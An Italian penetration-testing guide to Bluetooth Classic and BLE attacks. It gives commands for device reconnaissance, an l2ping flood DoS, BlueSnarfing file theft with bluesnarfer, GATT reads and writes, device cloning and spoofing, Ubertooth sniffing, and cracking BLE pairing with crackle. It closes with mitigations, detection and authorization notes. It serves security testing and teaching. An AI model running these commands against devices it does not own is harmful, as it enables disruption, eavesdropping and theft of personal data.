# Bluetooth Attacks

## Scopo

Questa guida copre vulnerabilità e tecniche di attacco contro dispositivi Bluetooth, inclusi Classic Bluetooth e Bluetooth Low Energy (BLE).

## Prerequisiti

- Adattatore Bluetooth compatibile (CSR/Ubertooth)
- Kali Linux
- BlueZ stack
- Ubertooth One (per sniffing avanzato)
- **Autorizzazione per testing**

## Installazione

```bash
sudo apt-get update
sudo apt-get install bluetooth bluez bluez-tools btscanner
sudo apt-get install ubertooth wireshark
```

---

## Bluetooth Basics

### Versioni e Differenze

| Tipo | Range | Velocità | Uso |
|------|-------|----------|-----|
| Classic (BR/EDR) | ~100m | 1-3 Mbps | Audio, file |
| BLE (4.0+) | ~50m | 1-2 Mbps | IoT, wearables |
| Dual Mode | Entrambi | Variabile | Smartphone |

### Architettura

```
- 79 canali (2402-2480 MHz)
- Frequency hopping
- Master-Slave architecture
- Pairing: PIN, SSP, OOB
```

---

## Reconnaissance

### Scanning

```bash
# Scan dispositivi
hcitool scan

# Scan con info
hcitool inq

# Nome device
hcitool name XX:XX:XX:XX:XX:XX

# Servizi
sdptool browse XX:XX:XX:XX:XX:XX
```

### BlueZ Commands

```bash
# Interfaccia
hciconfig hci0 up

# Modalità discovery
hciconfig hci0 piscan

# Info device
hciconfig -a
```

### btscanner

```bash
sudo btscanner
# Interfaccia ncurses per scan
```

---

## BLE Reconnaissance

### hcitool (BLE)

```bash
# Scan BLE
sudo hcitool lescan

# Info
sudo hcitool leinfo XX:XX:XX:XX:XX:XX
```

### Bettercap

```bash
sudo bettercap
> ble.recon on
> ble.show
> ble.enum XX:XX:XX:XX:XX:XX
```

### GATTacker

```bash
git clone https://github.com/nccgroup/gattacker.git
cd gattacker
npm install

# Scan
node scan.js
```

---

## Attacchi Classic Bluetooth

### BlueBorne (CVE-2017-1000251)

```bash
# Verifica vulnerabilità
# Tool: https://github.com/ArmisLabs/blueborne

# RCE su Linux
# Buffer overflow in L2CAP
# Affligge kernel < 4.13.1
```

### BlueSmack (DoS)

```bash
# Ping of death Bluetooth
l2ping -s 600 -f XX:XX:XX:XX:XX:XX
```

### BlueSnarfing

```bash
# Accesso non autorizzato a file
# OBEX push vulnerability

# Tool: Bluesnarfer
bluesnarfer -r 1-100 -C 7 -b XX:XX:XX:XX:XX:XX
```

### BlueBugging

```bash
# Controllo device via AT commands
# Richiede vulnerabilità implementazione

# rfcomm connect
rfcomm connect /dev/rfcomm0 XX:XX:XX:XX:XX:XX 1
```

### KNOB Attack (CVE-2019-9506)

```
- Key Negotiation of Bluetooth
- Downgrades encryption key length
- Affligge BR/EDR pre-patch
- Brute force chiave 1-byte possibile
```

---

## Attacchi BLE

### BLESA (BLE Spoofing Attack)

```bash
# Reconnection spoofing
# Impersona device precedentemente paired
# CVE-2020-9770 (Apple), CVE-2020-15802
```

### GATT Exploitation

```bash
# gatttool
gatttool -b XX:XX:XX:XX:XX:XX -I
> connect
> primary
> characteristics
> char-read-hnd 0x0003
> char-write-req 0x0003 01
```

### BLE Cloning

```bash
# Clona beacon BLE
# Crea copia identica
# Man-in-the-middle

# GATTacker
node advertise.js -g XX:XX:XX:XX:XX:XX
```

### Sniffing BLE

```bash
# Ubertooth
ubertooth-btle -f -c XX:XX:XX:XX:XX:XX

# Wireshark
# Capture su interfaccia Ubertooth
```

---

## Ubertooth One

### Setup

```bash
# Firmware update
ubertooth-dfu -d firmware.dfu

# Spectrum analysis
ubertooth-specan
```

### Sniffing

```bash
# Seguire connessione
ubertooth-btle -f

# LAP specifico
ubertooth-rx -l LAP

# Pipe a Wireshark
ubertooth-btle -f | wireshark -k -i -
```

---

## Tools Specializzati

### Crackle (BLE)

```bash
# Crack BLE Legacy pairing
git clone https://github.com/mikeryan/crackle.git
cd crackle && make

crackle -i capture.pcap -o decrypted.pcap
```

### Redfang

```bash
# Trova dispositivi nascosti
# Brute force BD_ADDR
./redfang -r 00:00:00:00:00:00-FF:FF:FF:FF:FF:FF
```

### Spooftooph

```bash
# Spoofa indirizzo Bluetooth
spooftooph -i hci0 -a XX:XX:XX:XX:XX:XX
```

---

## Automotive Bluetooth

```bash
# Molte auto usano BLE per keyless entry
# Relay attack possibile

# Scanner OBD-II Bluetooth
# Potenziale accesso a diagnostica

# Strumenti: 
# - CANalyze
# - Car Whisperer
```

---

## Mitigazioni

### Lato Utente

```
- Disabilita BT quando non in uso
- Modalità "non visibile"
- Aggiorna firmware
- Non accettare pairing sconosciuti
```

### Lato Sviluppatore

```
- Secure Simple Pairing (SSP)
- BLE Secure Connections
- Bonding con auth
- Random address
```

### Enterprise

```
- Policy Bluetooth
- MDM per device mobili
- Monitoring RF
- Disable Bluetooth ove possibile
```

---

## Detection

```bash
# Monitoring traffic anomalo
# Wireshark BT filter
bluetooth

# Ubertooth spectrum
ubertooth-specan

# btmon (Linux)
sudo btmon
```

---

## Best Practices

- **Authorization**: Test solo su propri device
- **Legal**: Verifica normative radio locali
- **Lab**: Ambiente controllato per ricerca
- **Updates**: Mantieni firmware aggiornato
- **Reporting**: Documenta vulnerabilità trovate

## Riferimenti

- [BlueZ Official](http://www.bluez.org/)
- [Ubertooth](https://github.com/greatscottgadgets/ubertooth)
- [BlueBorne Whitepaper](https://www.armis.com/blueborne/)
- [KNOB Attack](https://knobattack.com/)
